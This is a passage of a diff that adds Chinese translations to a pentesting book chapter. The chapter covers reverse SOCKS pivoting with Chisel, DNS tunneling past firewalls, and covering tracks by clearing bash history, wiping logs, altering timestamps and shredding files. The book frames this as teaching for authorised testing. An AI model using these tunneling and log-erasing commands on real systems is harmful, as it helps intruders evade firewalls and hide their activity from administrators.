   type: TYPE_NORMAL
+  zh: 接下来，使用 **./chisel server -p 8001 –reverse** 命令在 Kali 上启动 Chisel。然后，在目标（跳板）系统上运行
+    **./chisel client 10.0.0.66:8001 R:1080:socks** 命令。确保根据需要替换为您自己的 IP 地址。
 - en: Let’s see this in action. In the following screenshots, Kali has an IP address
     of **10.0.0.66** . The firewall at **10.0.0.149** has exposed a web server on
     port **80** . This web server is hosted at **10.1.1.103** on the other side of
     the firewall. I’ll use the Chisel SOCKS proxy to scan a Windows host on the **10.1.1.0/24**
     network, on the other side of the firewall from Kali.
+  id: totrans-240
   prefs: []
   type: TYPE_NORMAL
+  zh: 让我们看看实际操作。在以下截图中，Kali 的 IP 地址为 **10.0.0.66**。**10.0.0.149** 上的防火墙在端口 **80**
+    上暴露了一个 Web 服务器。该 Web 服务器位于防火墙的另一侧，IP 地址为 **10.1.1.103**。我将使用 Chisel 的 SOCKS 代理扫描位于
+    **10.1.1.0/24** 网络上的 Windows 主机，该网络位于防火墙的另一侧。
 - en: 'The following figure shows using Python to transfer the Chisel file before
     running the command to start the Chisel server:'
+  id: totrans-241
   prefs: []
   type: TYPE_NORMAL
+  zh: 下图显示了在运行命令启动 Chisel 服务器之前，使用 Python 传输 Chisel 文件：
 - en: '![Figure 12.12: Chisel is served to the pivot target from Kali and the server
     side is started](image/B22229_12_12.jpg)'
+  id: totrans-242
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.12：Chisel 从 Kali 提供给跳板目标，并启动服务器端](image/B22229_12_12.jpg)'
 - en: 'Figure 12.12: Chisel is served to the pivot target from Kali and the server
     side is started'
+  id: totrans-243
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.12：Chisel 从 Kali 提供给跳板目标，并启动服务器端
 - en: 'The following figure demonstrates the commands that have been run on the target
     to transfer Chisel and start the client side of the connection:'
+  id: totrans-244
   prefs: []
   type: TYPE_NORMAL
+  zh: 下图演示了在目标系统上执行的命令，用于传输 Chisel 并启动连接的客户端：
 - en: '![Figure 12.13: Chisel is started on the pivot host in client mode, completing
     the reverse SOCKS connection](image/B22229_12_13.jpg)'
+  id: totrans-245
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.13：Chisel 在跳板主机上以客户端模式启动，完成反向 SOCKS 连接](image/B22229_12_13.jpg)'
 - en: 'Figure 12.13: Chisel is started on the pivot host in client mode, completing
     the reverse SOCKS connection'
+  id: totrans-246
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.13：Chisel 在跳板主机上以客户端模式启动，完成反向 SOCKS 连接
 - en: 'With the connection established, we can use **proxychains** to scan through
     the **SOCKS** tunnel:'
+  id: totrans-247
   prefs: []
   type: TYPE_NORMAL
+  zh: 建立连接后，我们可以使用 **proxychains** 通过 **SOCKS** 隧道进行扫描：
 - en: '![Figure 12.14: Kali scans a Windows host through the SOCKS proxy](image/B22229_12_14.jpg)'
+  id: totrans-248
   prefs: []
   type: TYPE_IMG
+  zh: '![图 12.14：Kali 通过 SOCKS 代理扫描 Windows 主机](image/B22229_12_14.jpg)'
 - en: 'Figure 12.14: Kali scans a Windows host through the SOCKS proxy'
+  id: totrans-249
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.14：Kali 通过 SOCKS 代理扫描 Windows 主机
 - en: We’ve only scratched the surface of Chisel’s capabilities. You can use Chisel
     to pivot through multiple hops into a network.
+  id: totrans-250
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们仅仅触及了 Chisel 能力的表面。您可以使用 Chisel 通过多个跳跃进入网络。
 - en: Ligolo-ng works differently. Instead of creating a SOCKS proxy, it creates a
     userland network stack that works much like a VPN connection to route network
     traffic through a tunnel. You can find the tool, documentation, and command examples
     at [https://github.com/Nicocha30/ligolo-ng](https://github.com/Nicocha30/ligolo-ng)
     .
+  id: totrans-251
   prefs: []
   type: TYPE_NORMAL
+  zh: Ligolo-ng 的工作方式不同。它不是创建 SOCKS 代理，而是创建一个用户空间网络栈，类似于 VPN 连接，通过隧道路由网络流量。您可以在 [https://github.com/Nicocha30/ligolo-ng](https://github.com/Nicocha30/ligolo-ng)
+    找到该工具、文档和命令示例。
 - en: In some cases, you may not be able to establish outbound connections from an
     internal network to the Internet. In the next section, we’ll explore **DNS tunneling**
     as a slower yet dependable pivot technique.
+  id: totrans-252
   prefs: []
   type: TYPE_NORMAL
+  zh: 在某些情况下，您可能无法从内部网络建立到互联网的出站连接。在下一节中，我们将探讨 **DNS 隧道**，这是一种较慢但可靠的跳板技术。
 - en: DNS tunneling
+  id: totrans-253
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: DNS 隧道
 - en: DNS tunneling can be used to bypass firewalls and establish a covert channel
     for pivoting. I’ve used this technique when plugging miniature computers such
     as a Raspberry Pi into a network port to establish a covert tunnel out of restricted
@@ -1079,57 +1607,80 @@
     DNS tunneling as a failover for remote testing devices sent to client sites. If
     network restrictions prevented the testing device from connecting back to me,
     I can still establish a connection via the DNS tunnel and complete the pentest.
+  id: totrans-254
   prefs: []
   type: TYPE_NORMAL
+  zh: DNS 隧道可以用来绕过防火墙，并建立一个隐蔽的通道进行跳转。我曾在将微型计算机（如树莓派）插入网络端口时使用过这种技术，以便在阻止了外向的 SSH 或
+    Wireguard 连接时，从受限网络建立隐蔽通道。我也曾将 DNS 隧道作为远程测试设备的故障转移解决方案，发送到客户站点。如果网络限制阻止了测试设备与我连接，我仍然可以通过
+    DNS 隧道建立连接并完成渗透测试。
 - en: I’ve found that it may be difficult for some to understand how DNS tunneling
     works and you may assume that if port **53** outbound to the internet is blocked,
     then you’re blocking DNS tunneling. That is simply not true.
+  id: totrans-255
   prefs: []
   type: TYPE_NORMAL
+  zh: 我发现，许多人可能很难理解 DNS 隧道如何工作，你可能会认为如果阻止了 **53** 端口的外向连接，那么就能阻止 DNS 隧道的使用。但事实并非如此。
 - en: 'Here’s a step-by-step breakdown of how DNS tunneling typically works:'
+  id: totrans-256
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下是 DNS 隧道通常如何工作的分步解析：
 - en: The client, which is the device attempting to bypass network restrictions, creates
     a DNS query that contains encoded data as the subdomain name. This data might
     be part of a command, file, or other information that needs to be sent to an external
     server. The query is typically for a subdomain of a domain that’s controlled by
     the attacker or the legitimate service using DNS tunneling.
+  id: totrans-257
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 客户端，即试图绕过网络限制的设备，创建一个包含编码数据作为子域名的 DNS 查询。这些数据可能是命令、文件或其他需要发送到外部服务器的信息的一部分。该查询通常是针对由攻击者或使用
+    DNS 隧道的合法服务控制的域名的子域。
 - en: The client’s DNS query is sent to the DNS server that’s been configured for
     the network interface. The network DNS server can’t resolve the subdomain, so
     it forwards the request to the authoritative DNS server for the domain.
+  id: totrans-258
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 客户端的 DNS 查询被发送到已为网络接口配置的 DNS 服务器。网络 DNS 服务器无法解析该子域，因此将请求转发给该域名的权威 DNS 服务器。
 - en: The DNS query traverses the normal DNS resolution process, eventually reaching
     an authoritative DNS server controlled by the attacker.
+  id: totrans-259
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: DNS 查询通过正常的 DNS 解析过程，最终到达由攻击者控制的权威 DNS 服务器。
 - en: This server is configured to understand the encoded data within the DNS query.
     The authoritative DNS server decodes the data from the query, processes it (that
     is, executes a command), and then encodes a response within a DNS reply.
+  id: totrans-260
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 该服务器已配置为理解 DNS 查询中的编码数据。权威 DNS 服务器从查询中解码数据，处理它（即执行命令），然后将响应编码在 DNS 回复中。
 - en: The response is sent back to the client in the form of a DNS response, which
     appears to be a regular DNS response to any network monitoring system.
+  id: totrans-261
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 响应以 DNS 响应的形式返回给客户端，这看起来像是对任何网络监控系统而言的常规 DNS 响应。
 - en: The client receives the DNS response and decodes the data. This could be an
     acknowledgment, a piece of a file being exfiltrated, or a response to a command
     that was sent earlier.
+  id: totrans-262
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 客户端接收到 DNS 响应并解码数据。这可能是一个确认消息、被外泄的文件的一部分，或是对之前发送的命令的回应。
 - en: The process repeats as necessary, with the client and server continuing to communicate
     covertly via DNS queries and responses.
+  id: totrans-263
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 该过程根据需要重复进行，客户端和服务器继续通过 DNS 查询和响应进行隐蔽通信。
 - en: All except the most locked-down networks are going to forward requests for subdomains
     that can’t be resolved from the internal network DNS server to the authoritative
     server for the domain. This means that if you have to tunnel out of a network
@@ -1137,145 +1688,217 @@
     rule or otherwise must go through an HTTP/S proxy, you can bypass these network
     restrictions by utilizing DNS tunneling. It’s slow, hence why DNS tunneling is
     normally used as a last resort.
+  id: totrans-264
   prefs: []
   type: TYPE_NORMAL
+  zh: 除了最严格限制的网络外，其他网络都会将无法从内部网络 DNS 服务器解析的子域请求转发给该域的权威服务器。这意味着，如果你需要从要求所有外向网络流量通过防火墙规则允许或必须通过
+    HTTP/S 代理的网络中进行隧道传输，你可以通过利用 DNS 隧道绕过这些网络限制。虽然 DNS 隧道速度较慢，因此通常作为最后的手段使用。
 - en: To use this technique, you’ll need to set up an **iodined** server on a host
     that’s been exposed to the internet and ensure that it’s authoritative for the
     domain you’re using for tunneling.
+  id: totrans-265
   prefs: []
   type: TYPE_NORMAL
+  zh: 要使用此技术，你需要在已暴露到互联网的主机上设置一个 **iodined** 服务器，并确保它对你用作隧道的域名具有权威性。
 - en: 'See the iodined project documentation for configuration and execution instructions:
     [https://github.com/yarrick/iodine](https://github.com/yarrick/iodine) .'
+  id: totrans-266
   prefs: []
   type: TYPE_NORMAL
+  zh: 请查看 iodined 项目的文档，了解配置和执行说明：[https://github.com/yarrick/iodine](https://github.com/yarrick/iodine)
+    。
 - en: Be aware that a DNS tunnel is plaintext or unencrypted communications. Be sure
     to encrypt traffic through the tunnel. When used to communicate with a small drop
     box or remote testing device, I establish an SSH session through the DNS tunnel.
+  id: totrans-267
   prefs: []
   type: TYPE_NORMAL
+  zh: 请注意，DNS 隧道是明文或未加密的通信。务必通过隧道加密流量。当用于与一个小型数据箱或远程测试设备通信时，我会通过 DNS 隧道建立一个 SSH 会话。
 - en: This concludes our discussion on pivoting. At this point, you’ve learned how
     to use SSH and external tools to establish forward and reverse pivot tunnels,
     from basic through advanced scenarios. In the next section, we’ll discuss cleaning
     up and covering our tracks post-exploitation.
+  id: totrans-268
   prefs: []
   type: TYPE_NORMAL
+  zh: 这就是我们关于跳板技术的讨论。到目前为止，你已经学会了如何使用 SSH 和外部工具建立前向和反向跳板隧道，从基础到高级场景。接下来的章节，我们将讨论在利用后如何进行清理和掩盖痕迹。
 - en: Cleanup and covering tracks
+  id: totrans-269
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 清理与掩盖痕迹
 - en: In pentesting, it’s essential to clean up after completing your assessment.
     This process involves removing any artifacts, logs, or traces that might indicate
     your presence on the system. This section covers various techniques you can use
     to clean up and cover your tracks using Bash scripting.
+  id: totrans-270
   prefs: []
   type: TYPE_NORMAL
+  zh: 在渗透测试中，完成评估后清理非常重要。这个过程包括删除可能表明你在系统上存在的任何遗留物、日志或痕迹。本节内容介绍了你可以使用 Bash 脚本来清理和掩盖痕迹的各种技术。
 - en: One of the first steps in cleaning up is to clear the command history. This
     prevents the system administrator from seeing the commands you’ve executed.
+  id: totrans-271
   prefs: []
   type: TYPE_NORMAL
+  zh: 清理的第一步之一是清除命令历史。这可以防止系统管理员看到你执行过的命令。
 - en: The **history** command will clear and write an empty command history – that
     is, **history -cw** .
+  id: totrans-272
   prefs: []
   type: TYPE_NORMAL
+  zh: '**history** 命令会清除并写入空的命令历史 —— 即 **history -cw** 。'
 - en: The **history -c** command clears the current session’s history from memory,
     while the **history -w** command writes the (now empty) history to the history
     file, effectively erasing the previous contents.
+  id: totrans-273
   prefs: []
   type: TYPE_NORMAL
+  zh: '**history -c** 命令会从内存中清除当前会话的历史记录，而 **history -w** 命令会将（现在为空的）历史记录写入历史文件，从而有效地擦除之前的内容。'
 - en: Deleting the **~/.bash_history** file doesn’t clear the history because ending
     your current session will cause all commands that were entered during the session
     to be written to the recreated file on exit.
+  id: totrans-274
   prefs: []
   type: TYPE_NORMAL
+  zh: 删除 **~/.bash_history** 文件并不能清除历史记录，因为结束当前会话时，所有在会话中输入的命令将会被写入重建的文件。
 - en: You can also prevent any command history from being recorded by setting the
     **HISTFILE** environment variable to **/dev/null** at the start of a Bash session
     using the **set** **HISTFILE=/dev/null** command.
+  id: totrans-275
   prefs: []
   type: TYPE_NORMAL
+  zh: 你还可以通过在 Bash 会话开始时使用 **set HISTFILE=/dev/null** 命令将 **HISTFILE** 环境变量设置为 **/dev/null**，从而防止任何命令历史被记录。
 - en: 'System logs often contain evidence of your activities. Here’s a script you
     can use to clear common log files. You can find it in this chap ter’s GitHub repository
     as **ch12_clear_logs.sh** :'
+  id: totrans-276
   prefs: []
   type: TYPE_NORMAL
+  zh: 系统日志通常包含你的活动证据。这里有一个脚本可以用来清除常见的日志文件。你可以在本章节的 GitHub 仓库中找到它，名为 **ch12_clear_logs.sh**
+    ：
 - en: '[PRE22]'
+  id: totrans-277
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE22]'
 - en: This script iterates through an array of common log files. For each file that
     exists, it overwrites the contents with an empty string, effectively clearing
     the log. Of course, it requires root access to clear these files.
+  id: totrans-278
   prefs: []
   type: TYPE_NORMAL
+  zh: 该脚本会遍历一组常见的日志文件。对于每个存在的文件，它会用空字符串覆盖内容，从而有效地清除日志。当然，它需要 root 权限才能清除这些文件。
 - en: 'To make your activities less obvious, you can modify the timestamps of files
     you’ve accessed or modified. The following script will modify an array of files
     by changing the timestamp so that it matches the **/etc/hosts** file. You can
     find it in this chap ter’s GitHub repository as **ch12_timestamps.sh** :'
+  id: totrans-279
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了使你的活动不那么显眼，你可以修改你访问或修改的文件的时间戳。以下脚本将通过更改时间戳，使其与 **/etc/hosts** 文件的时间戳一致，从而修改一组文件。你可以在本章节的
+    GitHub 仓库中找到它，名为 **ch12_timestamps.sh** ：
 - en: '[PRE23]'
+  id: totrans-280
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE23]'
 - en: This script uses the **touch** command with the **-r** option to set the timestamp
     of each file in the list to match that of a reference file (in this case, **/etc/hosts**
     ).
+  id: totrans-281
   prefs: []
   type: TYPE_NORMAL
+  zh: 该脚本使用 **touch** 命令与 **-r** 选项，将列表中每个文件的时间戳设置为与参考文件（在此情况下为 **/etc/hosts** ）的时间戳一致。
 - en: 'For sensitive files that need to be completely erased, use the **shred** command:'
+  id: totrans-282
   prefs: []
   type: TYPE_NORMAL
+  zh: 对于需要彻底删除的敏感文件，使用 **shred** 命令：
 - en: '[PRE24]'
+  id: totrans-283
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE24]'
 - en: This command overwrites the file with random data three times ( **-n 3** ),
     then with zeros ( **-z** ), and finally removes the file ( **-u** ).
+  id: totrans-284
   prefs: []
   type: TYPE_NORMAL
+  zh: 该命令会用随机数据三次（ **-n 3** ）覆盖文件，然后用零（ **-z** ）覆盖，最后删除文件（ **-u** ）。
 - en: 'If you’ve made network connections, you might want to clear the ARP cache:'
+  id: totrans-285
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果您已建立网络连接，可能需要清除 ARP 缓存：
 - en: '[PRE25]'
+  id: totrans-286
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE25]'
 - en: This command flushes all entries from the ARP cache.
+  id: totrans-287
   prefs: []
   type: TYPE_NORMAL
+  zh: 此命令清除 ARP 缓存中的所有条目。
 - en: 'Here’s a comprehensive cleanup script that combines several of these techniques.
     It can be found in this chapter’s GitHub repository as **ch12_cleanup.sh** :'
+  id: totrans-288
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是一个综合清理脚本，结合了几种技术。可以在本章的 GitHub 存储库中找到名为**ch12_cleanup.sh**的脚本：
 - en: '[PRE26]'
+  id: totrans-289
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE26]'
 - en: 'This script performs the following actions:'
+  id: totrans-290
   prefs: []
   type: TYPE_NORMAL
+  zh: 此脚本执行以下操作：
 - en: Clears the Bash history
+  id: totrans-291
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 清除 Bash 历史记录
 - en: Clears common log files
+  id: totrans-292
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 清除常见日志文件
 - en: Removes temporary files that were created during the assessment
+  id: totrans-293
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 删除评估过程中创建的临时文件
 - en: Modifies the timestamps of important system files
+  id: totrans-294
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 修改重要系统文件的时间戳
 - en: Securely removes a sensitive file
+  id: totrans-295
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 安全地删除敏感文件
 - en: Flushes the ARP cache
+  id: totrans-296
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 清除 ARP 缓存
 - en: Remember, the effectiveness of these cleanup methods can vary depending on the
     system configuration and monitoring tools in place.
+  id: totrans-297
   prefs: []
   type: TYPE_NORMAL
+  zh: 请记住，这些清理方法的有效性可能会因系统配置和现有监控工具的不同而有所变化。
 - en: Proper cleanup also relies on keeping detailed notes of your activities and
     knowing your tools. Use of the **script** and **tee** commands to save a log file
     of your activities is also helpful and can save the day when you eventually forget
@@ -1285,89 +1908,122 @@
     will enable you to properly vet new tools in an offline lab environment to ensure
     they’re trustworthy, as well as provide a snapshot of system changes you can expect
     from your tools and exploits.
+  id: totrans-298
   prefs: []
   type: TYPE_NORMAL
+  zh: 适当的清理还依赖于详细记录您的活动并了解您的工具。使用**script**和**tee**命令保存活动日志文件也很有帮助，当您最终忘记为渗透测试报告拍摄截图时，可以挽救一天。始终注意您的渗透测试工具留下的妥协指标。有
+    Windows 和 Linux 工具可以在运行漏洞之前和之后进行快照和比较。这将使您能够在离线实验室环境中正确验证新工具的可信度，并提供您可以从工具和漏洞中预期的系统更改的快照。
 - en: 'The following are a select few Linux snapshot tools:'
+  id: totrans-299
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下是一些选择的 Linux 快照工具：
 - en: '**diff** **and cmp** :'
+  id: totrans-300
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**diff** **和 cmp**：'
 - en: '**diff** : A command-line tool that compares files line by line and outputs
     the differences. It can be used to compare configuration files, logs, or other
     text-based files before and after running an exploit.'
+  id: totrans-301
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**diff**：一款命令行工具，逐行比较文件并输出差异。可用于比较配置文件、日志或其他基于文本的文件在运行漏洞之前和之后的情况。'
 - en: '**cmp** : Another command-line tool that compares two files byte by byte and
     is useful for binary file comparison.'
+  id: totrans-302
   prefs:
   - PREF_IND
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**cmp**：另一个命令行工具，逐字节比较两个文件，对于二进制文件比较很有用。'
 - en: '**Tripwire** : A popular integrity monitoring tool that can be used to create
     a baseline of the filesystem and compare it against the system’s state after an
     exploit. It can alert you to changes in files, directories, and configurations.'
+  id: totrans-303
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**Tripwire**：一款流行的完整性监控工具，可用于创建文件系统基线，并在利用漏洞后将其与系统状态进行比较。它可以警告您文件、目录和配置的更改。'
 - en: '**Advanced Intrusion Detection Environment (AIDE)** : AIDE creates a database
     of system files’ checksums, and it can be used to compare the system’s state before
     and after running an exploit to detect changes in files and directories.'
+  id: totrans-304
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**高级入侵检测环境（AIDE）**：AIDE创建系统文件的校验和数据库，可用于比较运行漏洞之前和之后的系统状态以检测文件和目录的更改。'
 - en: '**Linux Auditing System (Auditd)** : Auditd allows you to monitor and log system
     calls and can be configured to track changes to files, directories, or even certain
     types of system activity. Comparing audit logs before and after running an exploit
     can help identify changes.'
+  id: totrans-305
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**Linux 审计系统（Auditd）**：Auditd允许您监视和记录系统调用，并可配置为跟踪文件、目录或甚至某些类型的系统活动的更改。在运行漏洞之前和之后比较审计日志可以帮助识别更改。'
 - en: '**OSSEC** : An open-source **host-based intrusion detection system** ( **HIDS**
     ) that can monitor system files, registry keys, and other critical areas for changes.
     It can be configured to alert you to modifications caused by an exploit.'
+  id: totrans-306
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**OSSEC**：一款开源**基于主机的入侵检测系统（HIDS）**，可监视系统文件、注册表键和其他关键区域的更改。它可以配置为警告您有关漏洞引起的修改。'
 - en: 'The following workflow will provide a snapshot of the changes that have been
     caused by a tool or exploit:'
+  id: totrans-307
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下工作流程将提供由工具或漏洞引起的更改的快照：
 - en: '**Create a baseline snapshot** : Use the selected tool to take a snapshot of
     the system before running the exploit. This snapshot will serve as the *before*
     state.'
+  id: totrans-308
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '**创建基准快照**：使用选定的工具在运行利用之前对系统进行快照。这个快照将作为*之前*状态。'
 - en: '**Execute the exploit** : Execute the exploit you’re testing on the system.'
+  id: totrans-309
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '**执行利用**：在系统上执行您正在测试的利用。'
 - en: '**Create a post-exploit snapshot** : Use the same tool to take a snapshot of
     the system after running the exploit.'
+  id: totrans-310
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '**创建利用后的快照**：使用相同的工具在运行利用后对系统进行快照。'
 - en: '**Compare the snapshots** : Use the comparison features of the tools to analyze
     the differences between the before and after snapshots, identifying any changes
     made by the exploit. This will help you log and analyze the impact of the exploit
     on the system.'
+  id: totrans-311
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: '**比较快照**：使用工具的比较功能分析快照之间的差异，识别利用所做的任何更改。这将帮助您记录和分析利用对系统的影响。'
 - en: This section provided a comprehensive primer on cleaning up after yourself and
     covering tracks. Two good rules to operate by are to do no harm and clean up after
     yourself. Always follow the Statement of Work and Rules of Engagement documents,
     and communicate with any points of contact or system owners when in doubt.
+  id: totrans-312
   prefs: []
   type: TYPE_NORMAL
+  zh: 本节提供了一个全面的清理和覆盖痕迹的入门指南。操作的两个好规则是不要造成伤害，并在操作后清理干净。始终遵循工作声明和参与规则文件，并在有疑问时与任何联系点或系统所有者沟通。
 - en: Summary
+  id: totrans-313
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 摘要
 - en: This chapter explored the essential techniques of maintaining persistence and
     executing pivoting operations during pentesting, with a focus on utilizing the
     Bash shell. We began by examining the fundamentals of persistence, including methods
@@ -1375,8 +2031,10 @@
     scripts, and system service manipulation. The chapter then progressed to more
     sophisticated persistence techniques, providing pentesters with a comprehensive
     toolkit for ensuring continued access.
+  id: totrans-314
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章探讨了在渗透测试过程中保持持久性和执行枢纽操作的基本技术，重点是利用Bash shell。我们首先研究了持久性的基础知识，包括通过cron作业、启动脚本和系统服务操纵建立对受损系统的长期访问的方法。然后，本章进一步发展到更复杂的持久性技术，为渗透测试人员提供了确保持续访问的全面工具包。
 - en: The latter half of this chapter shifted focus to network pivoting, starting
     with basic concepts and moving on to advanced strategies. Here, we covered how
     to implement port forwarding and tunneling mechanisms using SSH and other tools.
@@ -1385,9 +2043,13 @@
     footprints that are left during the testing process. Throughout this chapter,
     practical Bash scripts and commands were provided, accompanied by clear explanations
     to ensure you can apply these techniques in real-world scenarios effectively.
+  id: totrans-315
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章的后半部分将焦点转向网络枢纽，从基本概念开始，逐渐深入到高级策略。在这里，我们介绍了如何使用SSH和其他工具实现端口转发和隧道机制。本章以清理程序结束，详细介绍了您可以使用的方法来擦除命令历史记录，管理日志，并在测试过程中尽量减少留下的任何数字足迹。在整个本章中，我们提供了实用的Bash脚本和命令，并附有清晰的解释，以确保您可以有效地将这些技术应用于实际场景中。
 - en: In the next chapter, we’ll explore pentest reporting using Bash scripting and
     tools we can use to process data from tool output and formulate reports.
+  id: totrans-316
   prefs: []
   type: TYPE_NORMAL
+  zh: 在下一章中，我们将使用Bash脚本和工具探讨渗透测试报告，以及我们可以使用的工具来处理工具输出的数据并制定报告。
